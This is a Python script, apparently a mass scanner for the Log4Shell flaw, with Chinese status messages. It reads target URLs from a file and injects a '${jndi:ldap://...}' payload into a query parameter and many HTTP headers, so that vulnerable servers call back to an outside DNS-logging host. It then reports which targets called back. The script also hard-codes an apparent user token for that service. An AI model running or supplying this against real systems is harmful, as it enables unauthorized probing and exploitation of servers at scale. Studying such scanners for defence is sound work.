import random
import requests
import warnings

warnings.filterwarnings("ignore")

print('''
__  __  _                   ____            _
\ \/ / (_)   __ _    ___   | __ )    __ _  (_)
 \  /  | |  / _` |  / _ \  |  _ \   / _` | | |
 /  \  | | | (_| | | (_) | | |_) | | (_| | | |
/_/\_\ |_|  \__,_|  \___/  |____/   \__,_| |_|
''')
key = "012aIiRTYvR0ixLZKahf8KCMjUtD6oJDcH%2Fe9igqH%2BN5gSVJHOH7XQVtbA33G5pZbd38jyQtysAvjig%2BRzHF"
get_dns = "http://xvnming.org.cn/User/ajax.php?act=get_dnsurl"
get_log = "http://xvnming.org.cn/User/ajax.php?act=get_dnslog"
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
cookies = {
    'user_token': key
}
urls = []
print('正在获取Dnslog')
dnslog = requests.get(url=get_dns, cookies=cookies, verify=False).json()['msg']
print('Dnslog：%s' % dnslog)
with open('URL.txt', 'r') as f:
    for line in f:
        urls.append(line.strip('\n'))
print('正在验证漏洞······')
for url in urls:
    ID = str(random.randint(1000, 9999))
    payload = '${jndi:ldap://' + ID + '.' + dnslog + '/a}'
    params = {'id': payload}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko)',
        'Referer': payload, 'CF-Connecting_IP': payload, 'True-Client-IP': payload, 'X-Host': payload,
        'X-Forwarded-For': payload, 'Originating-IP': payload, 'X-Real-IP': payload, 'Proxy-Client-IP': payload,
        'X-Client-IP': payload, 'Forwarded': payload, 'Forwarded-For': payload, 'Client-IP': payload,
        'Contact': payload, 'X-Wap-Profile': payload, 'From': payload
    }
    try:
        requests.get(url, headers=headers, params=params, verify=False, timeout=5)
        log = requests.get(url=get_log, cookies=cookies, verify=False).text
        if ID in log:
            print('[+] %s' % url)
        else:
            print('[-] %s' % url)
    except:
        print('[!] Connection Denied %s' % url)
